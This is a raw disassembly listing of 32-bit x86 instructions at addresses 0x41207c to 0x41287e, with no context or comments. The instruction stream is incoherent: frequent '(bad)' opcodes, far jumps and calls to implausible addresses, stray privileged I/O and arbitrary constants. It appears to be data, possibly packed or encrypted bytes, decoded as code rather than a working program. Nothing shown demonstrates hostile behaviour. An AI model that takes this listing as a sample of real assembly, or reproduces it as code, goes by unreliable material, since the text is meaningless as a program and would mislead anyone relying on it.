  41207c:	add    edx,edi
  41207e:	push   ebp
  41207f:	mov    cs,WORD PTR [ecx]
  412081:	ss jmp 0x514bc57
  412087:	fcom   DWORD PTR [ebx+0x22]
  41208a:	add    ah,BYTE PTR [ebx]
  41208c:	push   ebp
  41208d:	(bad)  
  41208e:	fisubr WORD PTR [edx+0xf]
  412091:	mov    ds:0x6b79a50d,eax
  412096:	sub    edi,ebx
  412098:	cmp    bh,BYTE PTR [ebx]
  41209a:	xor    eax,0x95e36ec7
  41209f:	sbb    al,0x5c
  4120a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120a2:	dec    ebx
  4120a3:	sub    eax,0xbb20e9c
  4120a8:	sbb    eax,0xa71071d5
  4120ad:	push   ebp
  4120ae:	jnp    0x41210c
  4120b0:	jl     0x41203f
  4120b2:	int3   
  4120b3:	xor    eax,0xa6db6b9d
  4120b8:	xchg   ebp,eax
  4120b9:	jnp    0x412100
  4120bb:	enter  0x3a95,0x71
  4120bf:	(bad)  
  4120c0:	stos   BYTE PTR es:[edi],al
  4120c1:	aam    0x76
  4120c3:	int3   
  4120c4:	cli    
  4120c5:	jecxz  0x41206e
  4120c7:	in     al,dx
  4120c8:	inc    ebx
  4120c9:	pop    eax
  4120ca:	std    
  4120cb:	push   eax
  4120cc:	and    edx,DWORD PTR [ecx-0x36]
  4120cf:	sbb    eax,0x3f8e5f44
  4120d4:	hlt    
  4120d5:	and    BYTE PTR [ebp+0x4],ah
  4120d8:	call   0xa8df263f
  4120dd:	add    al,0xea
  4120df:	pop    es
  4120e0:	mov    al,0x81
  4120e2:	push   cs
  4120e3:	push   edi
  4120e4:	(bad)  
  4120e6:	js     0x412077
  4120e8:	xor    BYTE PTR [ecx+eiz*4],0x34
  4120ec:	scas   eax,DWORD PTR es:[edi]
  4120ed:	(bad)  [ebx]
  4120ef:	lods   eax,DWORD PTR ds:[esi]
  4120f0:	push   ebx
  4120f1:	adc    DWORD PTR [ebp-0x60e7042],ecx
  4120f7:	call   0xec1f:0xe6c88b20
  4120fe:	test   BYTE PTR [edx-0x47],0xd8
  412102:	hlt    
  412103:	mov    ch,dl
  412105:	cwde   
  412106:	jb     0x412096
  412108:	xlat   BYTE PTR ds:[ebx]
  412109:	inc    esi
  41210a:	aad    0xf5
  41210c:	nop
  41210d:	mov    al,0xda
  41210f:	inc    ecx
  412110:	out    dx,al
  412111:	inc    edx
  412112:	jg     0x412161
  412114:	xchg   DWORD PTR [ebp+0x5447833],esi
  41211a:	or     al,0x0
  41211c:	cs popa 
  41211e:	xchg   DWORD PTR [edx],ebx
  412120:	jb     0x412150
  412122:	js     0x4120cb
  412124:	inc    ebx
  412125:	lods   eax,DWORD PTR ds:[esi]
  412126:	add    dl,BYTE PTR [edx+ebx*1]
  412129:	fldenv [edi-0x6e]
  41212c:	out    dx,al
  41212d:	mul    BYTE PTR [edx]
  41212f:	rol    bl,0x1b
  412132:	fmul   st(3),st
  412134:	push   esi
  412135:	push   ebx
  412136:	dec    ebp
  412137:	out    0x19,al
  412139:	sbb    al,0x37
  41213b:	test   DWORD PTR [ebx-0x67],eax
  41213e:	push   0x7b6b8a08
  412143:	xchg   BYTE PTR [ebx-0x9c51fc1],al
  412149:	shr    DWORD PTR [ecx+0x57],cl
  41214c:	push   eax
  41214d:	fwait
  41214e:	daa    
  41214f:	xchg   DWORD PTR [esi+0x7a],esi
  412152:	retf   0x1397
  412155:	jl     0x4120ec
  412157:	pop    es
  412158:	dec    ecx
  412159:	inc    ebx
  41215a:	das    
  41215b:	pop    esp
  41215c:	popf   
  41215d:	push   edi
  41215e:	xchg   edi,eax
  41215f:	js     0x41217b
  412161:	call   0x8dca70f1
  412166:	and    eax,0xc97cf790
  41216b:	popa   
  41216c:	mov    ebp,0x3637e262
  412172:	xor    bh,dh
  412174:	das    
  412175:	jmp    0xb9a7:0x47a428a3
  41217c:	call   0xcc8c:0xebf83747
  412183:	add    al,0x24
  412185:	js     0x41217a
  412187:	aaa    
  412188:	out    0x19,al
  41218a:	ficomp DWORD PTR [esi-0x2e]
  41218d:	and    eax,0xc1d8bb7f
  412192:	shr    BYTE PTR [ebp+eiz*1-0x7a86cdef],1
  412199:	stc    
  41219a:	add    al,0x4a
  41219c:	jge    0x412198
  41219e:	push   ss
  41219f:	jmp    0x2b20:0xb7f2db98
  4121a6:	in     eax,dx
  4121a7:	lahf   
  4121a8:	xrelease mov DWORD PTR [esi],edi
  4121ab:	js     0x412205
  4121ad:	leave  
  4121ae:	adc    cl,dl
  4121b0:	popa   
  4121b1:	aad    0xd7
  4121b3:	cs jbe 0x4121b2
  4121b6:	push   edx
  4121b7:	ins    DWORD PTR es:[edi],dx
  4121b8:	les    esp,FWORD PTR [edi]
  4121ba:	push   ss
  4121bb:	mov    ?,WORD PTR [eax-0x3e]
  4121be:	outs   dx,DWORD PTR ds:[esi]
  4121bf:	xor    eax,0xa89c3e52
  4121c4:	mov    ebx,0x76835644
  4121c9:	add    al,0xfd
  4121cb:	inc    eax
  4121cc:	fs (bad) 
  4121ce:	jnp    0x412179
  4121d0:	(bad)
  4121d3:	cmp    al,0x73
  4121d5:	loopne 0x412192
  4121d7:	cmc    
  4121d8:	les    edx,FWORD PTR [ecx-0xe]
  4121db:	(bad)  
  4121dc:	(bad)  
  4121dd:	cmp    dl,dh
  4121df:	pop    ds
  4121e0:	cmp    DWORD PTR [esi],ebp
  4121e2:	or     dh,0x58
  4121e5:	sub    esp,DWORD PTR [ecx-0x4094c79e]
  4121eb:	leave  
  4121ec:	jmp    0x8632:0xde9467be
  4121f3:	out    dx,al
  4121f4:	inc    eax
  4121f5:	pop    ecx
  4121f6:	repnz inc edi
  4121f8:	jb     0x4121c8
  4121fa:	xchg   DWORD PTR [esi-0x6d],ebx
  4121fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121fe:	clc    
  4121ff:	aad    0x5a
  412201:	(bad)  
  412202:	rcl    BYTE PTR [eax+ebx*1-0x7ba0260d],1
  412209:	jp     0x4121b5
  41220b:	mov    edx,0xe2e333bc
  412210:	nop
  412211:	lds    esi,FWORD PTR ds:0x52e19a7e
  412217:	lds    ebx,FWORD PTR [esi-0x4d]
  41221a:	aam    0x7a
  41221c:	lds    ebp,FWORD PTR [ecx]
  41221e:	adc    ecx,eax
  412220:	je     0x412236
  412222:	sub    eax,edx
  412224:	push   edi
  412225:	pop    ebx
  412226:	cwde   
  412227:	or     DWORD PTR [edi+edx*1],esi
  41222a:	mov    WORD PTR [edx],gs
  41222c:	lods   eax,DWORD PTR ds:[esi]
  41222d:	repz xchg ebp,eax
  41222f:	dec    ebp
  412230:	stos   BYTE PTR es:[edi],al
  412231:	push   ds
  412232:	scas   al,BYTE PTR es:[edi]
  412233:	call   0x8e8a:0xce17d8c
  41223a:	or     BYTE PTR ds:0x579b5b0d,ch
  412240:	jb     0x412296
  412242:	out    0x53,al
  412244:	pop    esp
  412245:	fdivr  st(3),st
  412247:	xlat   BYTE PTR ds:[ebx]
  412248:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412249:	mov    eax,ds:0xc98070ee
  41224e:	int    0x33
  412250:	(bad)  
  412251:	retf   
  412252:	cdq    
  412253:	pop    ss
  412254:	dec    edx
  412255:	hlt    
  412256:	dec    edx
  412257:	or     DWORD PTR [ecx+ecx*4+0x32],0x2
  41225c:	xchg   esi,eax
  41225d:	jbe    0x41229a
  41225f:	cli    
  412260:	and    ch,bh
  412262:	cmp    ah,al
  412264:	fdivr  st,st(7)
  412266:	loope  0x4122e6
  412268:	xchg   ah,ch
  41226a:	out    dx,al
  41226b:	inc    ebp
  41226c:	rcl    BYTE PTR [eax+eiz*1-0x2371c657],1
  412273:	sub    BYTE PTR [ebx],dl
  412275:	and    al,0xa6
  412277:	jmp    0x4121fb
  412279:	adc    ebx,DWORD PTR [ecx-0x63437f26]
  41227f:	(bad)  
  412280:	call   0xe0492cbb
  412285:	or     al,ch
  412287:	jae    0x412252
  412289:	fsub   st(4),st
  41228b:	pop    esi
  41228c:	iret   
  41228d:	mov    dl,0xb2
  41228f:	add    DWORD PTR [eax+0xc],edi
  412292:	pop    ebx
  412293:	in     eax,0x75
  412295:	mov    ds:0x399ead58,al
  41229a:	pop    ecx
  41229b:	pop    esp
  41229c:	rol    BYTE PTR ds:0xdf3b3af3,0xae
  4122a3:	adc    eax,0x47048c72
  4122a8:	js     0x3ce92612
  4122ae:	push   edx
  4122af:	stos   BYTE PTR es:[edi],al
  4122b0:	sbb    esp,DWORD PTR [ebx]
  4122b2:	jno    0x412279
  4122b4:	shl    DWORD PTR [ecx+esi*8],cl
  4122b7:	paddsb mm1,QWORD PTR [ebx-0x1df0e02c]
  4122be:	imul   eax,DWORD PTR ds:0xf8c6dc58,0x19e2bd58
  4122c8:	fs ja  0x41227e
  4122cb:	int3   
  4122cc:	push   edi
  4122cd:	cmp    BYTE PTR [eax-0x3cac79d6],dh
  4122d3:	mov    edi,0xc7b166e2
  4122d8:	jle    0x412351
  4122da:	mov    ebx,0xe4ca55c5
  4122df:	xchg   edi,eax
  4122e0:	rcr    BYTE PTR [ebx+eiz*8+0x1a57b290],1
  4122e7:	in     eax,0xb8
  4122e9:	sub    eax,0x28dea8fe
  4122ee:	(bad)  
  4122ef:	pop    ss
  4122f0:	(bad)  
  4122f1:	dec    esp
  4122f2:	add    BYTE PTR [esi+0x59581575],al
  4122f8:	(bad)  
  4122f9:	sub    DWORD PTR [ebx+edx*1],edi
  4122fc:	int3   
  4122fd:	and    eax,0xa3384e13
  412302:	les    esi,FWORD PTR [ecx+0x6e]
  412305:	jmp    0x6eb13d10
  41230a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41230b:	addr16 xchg edi,eax
  41230d:	and    eax,DWORD PTR [ebp+0x52]
  412310:	cmp    edi,ebx
  412312:	es jo  0x4122c0
  412315:	call   0x2e47ba4d
  41231a:	ja     0x4122ae
  41231c:	sar    BYTE PTR ds:0x5bcb63b7,0xa5
  412323:	add    edi,edi
  412325:	retf   
  412326:	and    eax,0x579bda34
  41232b:	mov    ch,0xa1
  41232d:	das    
  41232e:	cmp    al,0xcd
  412330:	ret    0x632e
  412333:	rcr    DWORD PTR [ebx],0x6f
  412336:	lds    edx,FWORD PTR [edx+eiz*1-0xdad7db2]
  41233d:	fstp   QWORD PTR [eax]
  41233f:	sbb    eax,0x3ed5828e
  412344:	mov    ds:0xad4da3cc,al
  412349:	sar    edi,cl
  41234b:	inc    esi
  41234c:	out    dx,al
  41234d:	lods   eax,DWORD PTR ds:[esi]
  41234e:	pop    ebx
  41234f:	or     ebx,DWORD PTR [esp+ebx*2]
  412352:	sub    BYTE PTR [ebx+0x6b343a3d],cl
  412358:	dec    edx
  412359:	fbstp  TBYTE PTR [ecx+0x64d965a9]
  41235f:	call   0xb2dfc3ca
  412364:	test   eax,0xff687a2d
  412369:	lds    edi,FWORD PTR ds:0x7a36ccb0
  41236f:	mov    ds:0xb748032d,eax
  412374:	js     0x412381
  412376:	adc    al,dh
  412378:	or     cl,BYTE PTR [esi+0x44]
  41237b:	xor    DWORD PTR [eax-0x51],ebx
  41237e:	ret    
  41237f:	jp     0x412333
  412381:	repz lahf 
  412383:	cmp    ecx,ebx
  412385:	je     0x41238f
  412387:	sbb    ebp,esp
  412389:	sbb    BYTE PTR ds:0xab281e1a,dl
  41238f:	retf   
  412390:	iret   
  412391:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  412393:	cdq    
  412394:	std    
  412395:	(bad)  
  412396:	data16 out 0x71,al
  412399:	lock ss pop esi
  41239c:	dec    ecx
  41239d:	dec    edi
  41239e:	int3   
  41239f:	in     eax,0xd0
  4123a1:	das    
  4123a2:	xchg   edi,eax
  4123a3:	jp     0x4123dc
  4123a5:	adc    ebp,DWORD PTR [edx]
  4123a7:	enter  0x1b29,0x28
  4123ab:	lods   al,BYTE PTR ds:[esi]
  4123ac:	dec    ebx
  4123ad:	ds inc edx
  4123af:	cmp    BYTE PTR [eax+0x1eea2f9e],0xa5
  4123b6:	clc    
  4123b7:	and    al,0x1b
  4123b9:	xor    BYTE PTR ds:0xa6649186,bl
  4123bf:	aas    
  4123c0:	mov    al,ds:0x29e7e635
  4123c5:	adc    DWORD PTR [esi],edi
  4123c7:	aam    0x3
  4123c9:	rcr    dl,cl
  4123cb:	pop    ss
  4123cc:	outs   dx,BYTE PTR ds:[esi]
  4123cd:	jnp    0x4123ea
  4123cf:	inc    esp
  4123d0:	jmp    0xea26:0x84175e1e
  4123d7:	mov    cl,0x2b
  4123d9:	xor    ebx,ebx
  4123db:	loope  0x412384
  4123dd:	xor    al,0x90
  4123df:	ja     0x4123d1
  4123e1:	std    
  4123e2:	hlt    
  4123e3:	cdq    
  4123e4:	in     al,dx
  4123e5:	mov    ch,0xed
  4123e7:	or     al,0xe8
  4123e9:	adc    al,0xfe
  4123eb:	adc    eax,0x7e4278d1
  4123f0:	popa   
  4123f1:	xor    eax,0xd714ff62
  4123f6:	retf   
  4123f7:	mov    edi,0x8b9abf1a
  4123fc:	or     BYTE PTR [edx-0x40],dl
  4123ff:	int    0xc2
  412401:	lea    edx,[ebx-0x5a1c8a6e]
  412407:	clc    
  412408:	inc    ebx
  412409:	das    
  41240a:	(bad)  
  41240b:	into   
  41240c:	push   0x30
  41240e:	in     al,0xe8
  412410:	xor    BYTE PTR [esi],dl
  412412:	mov    ch,0x85
  412414:	adc    al,0x35
  412416:	arpl   WORD PTR [edx-0x36ce8c25],di
  41241c:	retf   
  41241d:	dec    ebp
  41241e:	idiv   BYTE PTR [ebp+0x29651ce4]
  412424:	and    esp,DWORD PTR [esi+0x1554e8a]
  41242a:	popw   ss
  41242c:	std    
  41242d:	mov    ah,0xe9
  41242f:	fs pushf 
  412431:	pop    edi
  412432:	lahf   
  412433:	mov    ebp,0x6b8041e8
  412438:	sbb    ah,al
  41243a:	push   ebp
  41243b:	cmp    BYTE PTR [eax-0x31fca5e4],ch
  412441:	xlat   BYTE PTR ds:[ebx]
  412442:	and    al,dh
  412444:	(bad)  
  412445:	hlt    
  412446:	sbb    al,0xea
  412448:	ja     0x4124ad
  41244a:	inc    eax
  41244b:	add    cl,BYTE PTR ds:0xa1792e46
  412451:	addr16 out 0xfa,al
  412454:	cmp    al,0x35
  412456:	inc    ebx
  412457:	cmc    
  412458:	xchg   DWORD PTR [eax],ebx
  41245a:	add    ecx,DWORD PTR [ecx+0x1cd6cf71]
  412460:	push   esp
  412461:	mov    ch,0x3e
  412463:	xchg   edx,eax
  412464:	popa   
  412465:	jge    0x412404
  412467:	or     eax,0xb91f626d
  41246c:	xor    BYTE PTR [esp+eiz*8-0x113b4ce9],0x82
  412474:	daa    
  412475:	mov    eax,ds:0x46fa25cb
  41247a:	jmp    0x412450
  41247c:	addr16 cmp ch,al
  41247f:	and    eax,0xbc2b5a22
  412484:	imul   ebx,DWORD PTR [ebp-0x57],0x4538a22c
  41248b:	push   ebx
  41248c:	jb     0x41241c
  41248e:	xchg   BYTE PTR [ebx-0x55],al
  412491:	ss inc ebp
  412493:	push   edx
  412494:	jp     0x412480
  412496:	xchg   ebp,eax
  412497:	into   
  412498:	jmp    0x412432
  41249a:	pushf  
  41249b:	adc    eax,0x769e5da7
  4124a0:	outs   dx,DWORD PTR ds:[esi]
  4124a1:	add    eax,DWORD PTR [ebx*1-0x1df2cd66]
  4124a8:	js     0x41247b
  4124aa:	jge    0x4124c2
  4124ac:	mov    dh,dh
  4124ae:	rol    DWORD PTR [esi],cl
  4124b0:	xor    al,0xce
  4124b2:	rcr    DWORD PTR [esi+0x43],1
  4124b5:	das    
  4124b6:	fsubr  QWORD PTR [ebp+eax*4-0x2a1e106f]
  4124bd:	pushf  
  4124be:	test   BYTE PTR [ecx-0x4f],0x1
  4124c2:	jne    0x4124ec
  4124c4:	nop
  4124c5:	out    0xfb,al
  4124c7:	in     al,dx
  4124c8:	jp     0x4124b6
  4124ca:	sub    eax,edi
  4124cc:	enter  0xeee1,0xe
  4124d0:	push   ds
  4124d1:	mov    eax,0x5997e104
  4124d6:	push   0x31
  4124d8:	inc    eax
  4124d9:	xchg   ebx,eax
  4124da:	rol    DWORD PTR [edi],1
  4124dc:	inc    esp
  4124dd:	daa    
  4124de:	ficom  WORD PTR [edi-0x2d]
  4124e1:	es jmp 0x333d:0x68fcca38
  4124e9:	adc    al,0xcb
  4124eb:	adc    eax,DWORD PTR [edx+ecx*4+0x4c1cd706]
  4124f2:	fld    TBYTE PTR ds:0xe7fa47f3
  4124f8:	xor    DWORD PTR [ecx-0x75035f75],ecx
  4124fe:	gs or  eax,0x6056921b
  412504:	xchg   edi,eax
  412505:	lahf   
  412506:	jle    0x41250b
  412508:	jg     0x412564
  41250a:	not    BYTE PTR [esi+0xb72109e]
  412510:	scas   eax,DWORD PTR es:[edi]
  412511:	int3   
  412512:	sub    BYTE PTR [edi-0x27],dl
  412515:	js     0x412566
  412517:	xchg   edx,eax
  412518:	dec    ecx
  412519:	push   ss
  41251a:	dec    edx
  41251b:	into   
  41251c:	or     BYTE PTR [edi+0x44],dl
  41251f:	into   
  412520:	jne    0x4124b1
  412522:	retf   0x2a19
  412525:	jmp    0x6356403d
  41252a:	clc    
  41252b:	xchg   edi,eax
  41252c:	daa    
  41252d:	lods   eax,DWORD PTR ds:[esi]
  41252e:	inc    ecx
  41252f:	dec    ebx
  412530:	jge    0x4124b8
  412532:	xor    DWORD PTR [ecx],esp
  412534:	test   eax,0xac012581
  412539:	or     ch,BYTE PTR [ebx+0x7d0dd3e4]
  41253f:	jns    0x4125b1
  412541:	push   eax
  412542:	mov    ah,ch
  412544:	adc    BYTE PTR [edi+0x4d9abd79],0x2e
  41254b:	call   0x533a:0x30247835
  412552:	add    esi,DWORD PTR ds:0x59
  412557:	lods   al,BYTE PTR ds:[esi]
  412558:	clc    
  412559:	mov    esi,ecx
  41255b:	push   ecx
  41255c:	loopne 0x4124f9
  41255e:	(bad)  
  41255f:	iret   
  412560:	retf   
  412561:	add    edi,esi
  412563:	stc    
  412564:	(bad)  
  412566:	jg     0x412572
  412568:	fbstp  TBYTE PTR [eax+0x30]
  41256b:	ss pop eax
  41256d:	out    dx,eax
  41256e:	pop    es
  41256f:	(bad)  
  412570:	pop    ecx
  412571:	sub    al,BYTE PTR [ebx+0x26]
  412574:	jl     0x412545
  412576:	seto   BYTE PTR [eax+0x680a2c4d]
  41257d:	xor    dl,al
  41257f:	retf   0xd13f
  412582:	add    eax,0xd3757995
  412587:	rcr    DWORD PTR [ebp-0x4e],0xd
  41258b:	or     BYTE PTR [esi],ch
  41258d:	fld    TBYTE PTR [edi]
  41258f:	daa    
  412590:	aam    0x6b
  412592:	test   DWORD PTR [ebx+ecx*2+0x29],ebp
  412596:	out    0x63,eax
  412598:	scas   eax,DWORD PTR es:[edi]
  412599:	push   0xffffff9f
  41259b:	mov    dh,0xaa
  41259d:	inc    ecx
  41259e:	inc    edi
  41259f:	and    BYTE PTR [edi+0x6c9b6224],dl
  4125a5:	jge    0x41255b
  4125a7:	dec    edx
  4125a8:	dec    esi
  4125a9:	sub    ebx,0xffffffe7
  4125ac:	(bad)  
  4125ae:	inc    eax
  4125af:	adc    eax,0x3c292d25
  4125b4:	sub    DWORD PTR [ebx],edx
  4125b6:	jae    0x41255a
  4125b8:	jp     0x4125e7
  4125ba:	hlt    
  4125bb:	add    ebx,DWORD PTR [esi]
  4125bd:	adc    edi,DWORD PTR [eax+0x22]
  4125c0:	xchg   DWORD PTR [ebp+esi*4-0x77],ecx
  4125c4:	mov    ds:0x73ac6d13,al
  4125c9:	adc    ch,BYTE PTR ds:0xaa762f53
  4125cf:	sub    dl,cl
  4125d1:	mov    dh,0xd0
  4125d3:	push   ebx
  4125d4:	mov    edi,?
  4125d6:	sub    BYTE PTR [esi+0x1647fb65],cl
  4125dc:	fdiv   QWORD PTR [eax+edi*8+0x34490cb4]
  4125e3:	or     al,0xd3
  4125e5:	xor    ebp,DWORD PTR [ebp-0x43758218]
  4125eb:	sub    al,0x36
  4125ed:	and    DWORD PTR [ebp-0x74],esp
  4125f0:	sub    BYTE PTR [esi],ah
  4125f2:	cld    
  4125f3:	mov    esi,ecx
  4125f5:	sub    ch,BYTE PTR [edx-0x6e871201]
  4125fb:	rol    ch,0x1b
  4125fe:	js     0x412613
  412600:	mov    ebx,0x7e26a6e3
  412605:	mov    DWORD PTR [esi+0x41],edi
  412608:	inc    edi
  412609:	ja     0x4125a5
  41260b:	pop    ebx
  41260c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41260d:	bound  edi,QWORD PTR [esi]
  41260f:	push   ecx
  412610:	cmp    eax,0x53282c59
  412615:	sub    DWORD PTR [esi-0x1f36a6a5],0xf
  41261c:	pop    es
  41261d:	fbstp  TBYTE PTR [edi+0x2e]
  412620:	stos   BYTE PTR es:[edi],al
  412621:	mov    ds:0xad9fe676,eax
  412626:	ror    DWORD PTR [eax],cl
  412628:	stc    
  412629:	add    eax,0xeb8088de
  41262e:	out    0x3c,eax
  412630:	fsub   QWORD PTR [ecx+esi*1-0x80]
  412634:	test   al,0xb4
  412636:	sub    DWORD PTR [eax],0xffffffaf
  412639:	jl     0x4125d3
  41263b:	jp     0x4125c0
  41263d:	test   BYTE PTR [edx+0x9],bh
  412640:	mov    ecx,DWORD PTR [edi+0x20]
  412643:	push   0xa40db6e7
  412648:	sub    BYTE PTR [ebp+edx*8+0x6b],0xd0
  41264d:	adc    dl,bl
  41264f:	push   0xffffffc6
  412651:	inc    ecx
  412652:	sbb    al,0xe4
  412654:	ja     0x41266a
  412656:	fsubr  QWORD PTR [eax-0xadfbd56]
  41265c:	sub    ah,BYTE PTR [edi-0x64ebc52a]
  412662:	pushf  
  412663:	mov    edx,DWORD PTR ds:0xdcee9236
  412669:	pop    es
  41266a:	in     al,0xa4
  41266c:	addr16 cld 
  41266e:	push   esp
  41266f:	in     eax,dx
  412670:	pop    eax
  412671:	lods   al,BYTE PTR ds:[esi]
  412672:	mov    DWORD PTR [eax-0x14389af6],eax
  412678:	lods   eax,DWORD PTR ds:[esi]
  412679:	jmp    0x412695
  41267b:	pop    ss
  41267c:	and    ch,BYTE PTR [ebp+0x36cab4af]
  412682:	lock pop edx
  412684:	ficomp WORD PTR [edi+0x2]
  412687:	test   al,0x89
  412689:	add    al,0xa6
  41268b:	jb     0x412694
  41268d:	icebp  
  41268e:	cmp    ch,0xa1
  412691:	mov    edi,0xb00e481e
  412696:	loope  0x41263b
  412698:	int    0x84
  41269a:	inc    esp
  41269b:	push   ss
  41269c:	xchg   BYTE PTR [ebp+0x7],ch
  41269f:	pop    edx
  4126a0:	xchg   esi,eax
  4126a1:	ds jecxz 0x412636
  4126a4:	lea    edx,[edx-0x65]
  4126a7:	mov    ebp,0x9432e75b
  4126ac:	cs cwde 
  4126ae:	xor    eax,0x38070bfb
  4126b3:	dec    ebp
  4126b4:	xor    dl,BYTE PTR [edx-0xf]
  4126b7:	or     ebp,DWORD PTR [ecx+0x76]
  4126ba:	test   DWORD PTR [esi+0x75127933],esi
  4126c0:	rol    BYTE PTR ds:0x122136c,cl
  4126c6:	nop
  4126c7:	mov    eax,ds:0x80f0becb
  4126cc:	pop    ecx
  4126cd:	sahf   
  4126ce:	xor    eax,0x7383fafd
  4126d3:	jo     0x4126b2
  4126d5:	hlt    
  4126d6:	pop    eax
  4126d7:	pop    edx
  4126d8:	stc    
  4126d9:	sub    eax,0x46728d06
  4126de:	jno    0x4126fc
  4126e0:	adc    dh,BYTE PTR [edx+0x29]
  4126e3:	dec    esp
  4126e4:	fs mov ch,0x15
  4126e7:	(bad)  
  4126e8:	call   0x25c02429
  4126ed:	sub    bh,BYTE PTR [ebp-0x48]
  4126f0:	or     BYTE PTR [eax],dl
  4126f2:	sti    
  4126f3:	xchg   edx,eax
  4126f4:	scas   al,BYTE PTR es:[edi]
  4126f5:	and    al,0x9a
  4126f7:	test   BYTE PTR [ecx+0x11e6852b],cl
  4126fd:	ins    DWORD PTR es:[edi],dx
  4126fe:	gs xor al,0xe8
  412701:	pop    esp
  412702:	leave  
  412703:	in     eax,dx
  412704:	pop    ebx
  412705:	aam    0xec
  412707:	inc    esi
  412708:	aam    0x1d
  41270a:	mov    cl,0x38
  41270c:	fsub   st(6),st
  41270e:	or     esp,DWORD PTR [ebx+0x7ff44246]
  412714:	dec    ebp
  412715:	mov    bh,0x43
  412717:	inc    ecx
  412718:	sub    eax,0x3adbab88
  41271d:	xor    ebx,esp
  41271f:	ins    DWORD PTR es:[edi],dx
  412720:	push   ebx
  412721:	lahf   
  412722:	jmp    0x13e8abd1
  412727:	add    bl,BYTE PTR ds:0xa4989b60
  41272d:	call   0xefed:0xbe8d0dd
  412734:	and    bh,ah
  412736:	(bad)  
  412737:	jmp    0xa9d1f6c2
  41273c:	cld    
  41273d:	mov    WORD PTR [ecx+0x30],es
  412740:	mov    eax,ds:0x8d9390c0
  412745:	mov    ecx,0xb9808140
  41274a:	push   ss
  41274b:	push   0x63
  41274d:	inc    ebx
  41274e:	call   0xcd7291ae
  412753:	push   ss
  412754:	dec    ecx
  412755:	loopne 0x412732
  412757:	popa   
  412758:	std    
  412759:	(bad)  
  41275a:	xor    ebx,DWORD PTR [edx+ebp*1+0x7d]
  41275e:	mov    esi,0x2f5ddced
  412763:	dec    ebx
  412764:	leave  
  412765:	xchg   BYTE PTR [eax],bl
  412767:	fisub  WORD PTR [ebx-0x3f]
  41276a:	mov    dl,0x1f
  41276c:	jo     0x412775
  41276e:	add    eax,0x5829df88
  412773:	or     cl,dl
  412775:	and    dh,cl
  412777:	cwde   
  412778:	mov    al,ds:0x2063eddd
  41277d:	repnz inc ebx
  41277f:	popf   
  412780:	cwde   
  412781:	jle    0x412784
  412783:	sbb    edi,esi
  412785:	cmp    DWORD PTR ss:[eax],edi
  412788:	jmp    0x412793
  41278a:	(bad)  
  41278b:	cmp    eax,0x91816664
  412790:	rcl    DWORD PTR [eax-0x114d67a2],cl
  412796:	pop    es
  412797:	fstp   TBYTE PTR [ecx]
  412799:	daa    
  41279a:	xchg   ebx,eax
  41279b:	fsubr  st(3),st
  41279d:	mov    BYTE PTR [ebx+0x3207f481],bh
  4127a3:	ret    0xeb4b
  4127a6:	mov    ds:0x96484457,al
  4127ab:	ja     0x412813
  4127ad:	(bad)  
  4127ae:	stc    
  4127af:	xchg   ebx,eax
  4127b0:	xchg   ebx,eax
  4127b1:	push   ebp
  4127b2:	xchg   edx,eax
  4127b3:	fiadd  WORD PTR [edi-0x67758ce7]
  4127b9:	sar    BYTE PTR [ebp+0xe],cl
  4127bc:	mov    esp,0x58b66209
  4127c1:	xor    eax,eax
  4127c3:	mov    BYTE PTR [ebp+0x2914463c],bl
  4127c9:	gs repnz sbb dh,cl
  4127cd:	test   DWORD PTR [edx+0x34],edi
  4127d0:	aam    0x80
  4127d2:	add    DWORD PTR [edx-0x72],esi
  4127d5:	mov    esi,0xbf1ddffc
  4127da:	xchg   ebp,eax
  4127db:	xchg   ebx,eax
  4127dc:	xchg   edi,eax
  4127dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127de:	ret    
  4127df:	sar    BYTE PTR [ecx+0x4f],cl
  4127e2:	push   ecx
  4127e3:	iret   
  4127e4:	sub    BYTE PTR [eax+esi*8-0x2f],0xf9
  4127e9:	mov    edi,0x881b52
  4127ee:	shl    BYTE PTR [edi+0x18],1
  4127f1:	xlat   BYTE PTR ds:[ebx]
  4127f2:	add    BYTE PTR ds:[eax-0x3909a3b0],cl
  4127f9:	push   ebp
  4127fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127fb:	mov    cl,0x37
  4127fd:	pop    edi
  4127fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127ff:	loope  0x4127d1
  412801:	into   
  412802:	mov    esi,cs
  412804:	mov    ah,0xda
  412806:	push   ds
  412807:	ret    
  412808:	repnz push esi
  41280a:	leave  
  41280b:	je     0x412829
  41280d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41280e:	mov    cl,0x57
  412810:	dec    eax
  412811:	inc    edi
  412812:	or     ebp,DWORD PTR [edi-0x36]
  412815:	adc    eax,0x16917956
  41281a:	(bad)  
  41281b:	jl     0x412880
  41281d:	loope  0x41282d
  41281f:	(bad)  
  412820:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412821:	jl     0x41284c
  412823:	xor    edi,DWORD PTR [ebx+0x41]
  412826:	loopne 0x4127d5
  412828:	xor    BYTE PTR [edx+0x13be14e8],ch
  41282e:	retf   0x8700
  412831:	adc    BYTE PTR [ebx],0xda
  412834:	sub    al,0x34
  412836:	add    al,0x52
  412838:	(bad)  
  412839:	jmp    0x5f8a:0x2d2aba98
  412840:	mov    ds,WORD PTR [esi-0x54]
  412843:	mov    ch,0x72
  412845:	cmp    al,0x26
  412847:	or     BYTE PTR [edx+ebx*1-0x70],bl
  41284b:	add    al,0x2a
  41284d:	push   ds
  41284e:	mov    edi,0x802acc7a
  412853:	mov    ch,0xa9
  412855:	call   0x99ffbc2e
  41285a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41285b:	ret    
  41285c:	into   
  41285d:	mov    ebx,0x6472a41e
  412862:	mov    DWORD PTR [esi+0x68],ebx
  412865:	cmp    ch,0xf8
  412868:	push   0x229c73e1
  41286d:	jbe    0x412890
  41286f:	idiv   DWORD PTR [ebx+0x170e3687]
  412875:	add    ah,bh
  412877:	arpl   WORD PTR [ecx],si
  412879:	mov    cl,0x9d
  41287b:	shl    BYTE PTR [ecx+0x79],1
  41287e:	add    DWORD PTR [edi+0x6f],ecx
